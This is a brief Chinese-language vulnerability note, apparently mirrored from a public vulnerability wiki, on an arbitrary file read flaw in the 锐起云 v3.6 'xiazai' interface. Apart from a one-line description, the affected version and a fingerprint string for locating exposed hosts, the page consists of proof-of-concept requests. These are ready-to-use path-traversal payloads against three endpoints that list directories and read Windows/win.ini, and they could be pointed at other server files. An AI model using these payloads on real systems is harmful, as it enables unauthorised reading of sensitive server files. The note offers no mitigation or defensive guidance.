---
title: "锐起云 xiazai 任意文件读取漏洞"
date: 2026-10-16 09:11:48
categories:
  - WebSecurity
  - CVE
  - "Web应用"
  - "锐起云-xiazai"
tags:
  - "锐起云-xiazai"
  - "任意文件读取"
  - "漏洞复现"
---
## 漏洞描述

锐起云 xiazai 接口存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器中的敏感文件。

## 漏洞影响

锐起云 v3.6

## 网络测绘

```
"锐起云"
```

## 漏洞复现

登陆页面

![image-20231115100316838](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/image-20231115100316838.png)

验证POC

```
/dwr/hret/fileTree?filePath=../
/dwr/srecy/xiazai?filePath=../../../../../../../../../../../Windows/win.ini
/dwr/hret/downfile?fpid=../../../../../../../../../Windows/win.ini 
```

![image-20231115100630776](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/image-20231115100630776.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/%E9%94%90%E8%B5%B7%E4%BA%91-xiazai-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md)
